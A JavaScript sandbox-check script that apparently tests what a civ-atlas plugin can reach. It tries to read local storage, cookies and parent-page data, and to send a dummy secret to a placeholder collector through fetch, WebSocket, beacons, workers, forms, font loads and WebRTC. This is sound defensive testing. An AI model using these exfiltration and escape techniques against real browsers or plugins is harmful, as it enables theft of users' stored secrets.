// 插件能想到的坏事,一项项试。连没连出去以收信站为准,这里记的只是插件自己看到的。
// 在线程里跑是正常情况;scripts/sandbox-check.ts 还会把它直接放进框的页面里跑,对照少一层会漏什么。
(async () => {
  const C = '__COLLECT__';
  const WS = '__WS__';
  const H = '__HOST__';
  const PRECONNECT = '__PRECONNECT__';
  const TURN = '__TURN__';
  const UDP = '__UDP__';
  const inPage = typeof document !== 'undefined';
  const results = [];
  const rec = (name, outcome) => results.push({ name, outcome: String(outcome).slice(0, 200) });
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const tryit = async (name, fn) => {
    try {
      rec(name, 'ok:' + (await Promise.race([fn(), wait(3000).then(() => 'no answer in 3s')])));
    } catch (e) {
      rec(name, 'err:' + (e && e.name) + ':' + (e && e.message));
    }
  };
  const until = (setup, ms = 1500) =>
    new Promise((res, rej) => {
      setup(res, rej);
      setTimeout(() => res('timeout'), ms);
    });

  rec('where', inPage ? 'page' : 'worker');
  rec('origin', self.origin);
  for (const k of ['document', 'parent', 'localStorage', 'indexedDB', 'caches', 'RTCPeerConnection', 'WebSocket', 'WebTransport', 'SharedArrayBuffer', 'Worker']) {
    let t;
    try {
      t = typeof self[k];
    } catch (e) {
      t = 'throws ' + e.name;
    }
    rec('typeof ' + k, t);
  }

  // 本机存的东西
  await tryit('indexedDB', () =>
    new Promise((res, rej) => {
      const r = indexedDB.open('civ-atlas-check-vault');
      r.onsuccess = () => {
        try {
          const g = r.result.transaction('manifests').objectStore('manifests').get('w1');
          g.onsuccess = () => res('read ' + JSON.stringify(g.result));
          g.onerror = () => rej(g.error);
        } catch (e) {
          res('opened, no data (' + e.name + ')');
        }
      };
      r.onerror = () => rej(r.error);
    }),
  );
  await tryit('caches', () => caches.keys().then((k) => 'keys ' + k.length));
  await tryit('opfs', () => navigator.storage.getDirectory().then(() => 'opened'));
  await tryit('localStorage', () => localStorage.getItem('civ-atlas:ai-secrets'));
  if (inPage) {
    await tryit('document.cookie', () => document.cookie);
    await tryit('parent.localStorage', () => parent.localStorage.getItem('civ-atlas:ai-secrets'));
    await tryit('parent.document', () => parent.document.title);
  }

  // 联网
  await tryit('fetch', () => fetch(C + '/fetch?d=sk-CHECK-SECRET').then((r) => r.status));
  await tryit('fetch no-cors', () => fetch(C + '/fetch-nocors', { mode: 'no-cors' }).then((r) => r.type));
  await tryit('fetch keepalive', () => fetch(C + '/fetch-keepalive', { method: 'POST', body: 'x', keepalive: true }).then((r) => r.status));
  await tryit('fetch site', () => fetch(H + '/site-fetch').then((r) => r.status));
  await tryit('fetch data:', () => fetch('data:text/plain,hi').then((r) => r.status));
  await tryit('xhr', () =>
    new Promise((res, rej) => {
      const x = new XMLHttpRequest();
      x.open('GET', C + '/xhr');
      x.onload = () => res(x.status);
      x.onerror = () => rej(new Error('xhr error'));
      x.send();
    }),
  );
  await tryit('websocket', () =>
    until((res, rej) => {
      const w = new WebSocket(WS + '/ws');
      w.onopen = () => res('open');
      w.onerror = () => rej(new Error('ws error'));
    }),
  );
  await tryit('eventsource', () =>
    until((res, rej) => {
      const es = new EventSource(C + '/es');
      es.onopen = () => res('open');
      es.onerror = () => {
        es.close();
        rej(new Error('es error'));
      };
    }),
  );
  if (!inPage) await tryit('importScripts', () => (importScripts(C + '/import.js'), 'loaded'));
  await tryit('dynamic import', () => import(C + '/dynimport.js').then(() => 'loaded'));
  await tryit('new Worker(url)', () =>
    until((res, rej) => {
      const w = new Worker(C + '/worker.js');
      w.onerror = () => rej(new Error('worker error'));
    }, 800),
  );
  await tryit('blob worker fetch', () =>
    until((res) => {
      const u = URL.createObjectURL(new Blob(["fetch('" + C + "/nested-fetch').then((r) => postMessage('ok ' + r.status), (e) => postMessage('err ' + e.message))"], { type: 'text/javascript' }));
      const w = new Worker(u);
      w.onmessage = (e) => res(e.data);
      w.onerror = (e) => res('worker error ' + e.message);
    }),
  );
  await tryit('FontFace', () => new FontFace('x', 'url(' + C + '/font.woff2)').load().then(() => 'loaded'));
  await tryit('sendBeacon', () => (navigator.sendBeacon ? navigator.sendBeacon(C + '/beacon', 'x') : 'no sendBeacon'));
  await tryit('WebTransport', () => (typeof WebTransport === 'undefined' ? 'no WebTransport' : new WebTransport('https://127.0.0.1:' + UDP + '/wt').ready.then(() => 'ready')));

  // 从字符串变出代码
  await tryit('eval', () => eval('1 + 1'));
  await tryit('new Function', () => new Function('return 2')());
  await tryit('setTimeout(string)', async () => {
    self.__ran = 'no';
    setTimeout("self.__ran = 'RAN'", 0);
    await wait(200);
    return self.__ran;
  });
  await tryit('WebAssembly', () => WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(() => 'compiled'));

  // 跟网站页面同名的频道喊话
  await tryit('BroadcastChannel', () => {
    for (const name of ['civ-atlas', 'civ-atlas-check']) new BroadcastChannel(name).postMessage('from-plugin sk-CHECK-SECRET');
    return 'posted';
  });

  if (inPage) {
    const tag = (name, attrs) =>
      tryit(name, () => {
        const el = Object.assign(document.createElement(attrs.tag), attrs.props);
        document.head.append(el);
        return 'appended';
      });
    await tag('img', { tag: 'img', props: { src: C + '/img.png' } });
    await tag('stylesheet', { tag: 'link', props: { rel: 'stylesheet', href: C + '/style.css' } });
    await tag('preconnect', { tag: 'link', props: { rel: 'preconnect', href: 'http://127.0.0.1:' + PRECONNECT } });
    await tag('prefetch', { tag: 'link', props: { rel: 'prefetch', href: C + '/prefetch' } });
    await tryit('window.open', () => String(window.open(C + '/open')));
    await tryit('link target=_blank', () => {
      const a = Object.assign(document.createElement('a'), { href: C + '/link-blank', target: '_blank' });
      document.body.append(a);
      a.click();
      return 'clicked';
    });
    await tryit('form', () => {
      const f = Object.assign(document.createElement('form'), { action: C + '/form', method: 'GET', target: '_blank' });
      document.body.append(f);
      f.submit();
      return 'submitted';
    });
    await tryit('serviceWorker', () => (navigator.serviceWorker ? navigator.serviceWorker.register('/sw.js').then(() => 'registered') : 'none'));
    await tryit('RTCPeerConnection', async () => {
      if (typeof RTCPeerConnection === 'undefined') return 'none';
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:' + TURN + '?transport=tcp', username: 'u', credential: 'c' }, { urls: 'stun:127.0.0.1:' + UDP }] });
      pc.createDataChannel('x');
      const kinds = [];
      pc.onicecandidate = (e) => e.candidate && kinds.push(e.candidate.type);
      await pc.setLocalDescription(await pc.createOffer());
      await wait(2000);
      pc.close();
      return 'candidates ' + kinds.join(',');
    });
  }

  await wait(300);
  const done = { type: 'results', results };
  if (typeof civAtlas !== 'undefined') civAtlas.post(done);
  else parent.postMessage(done, '*');
})();
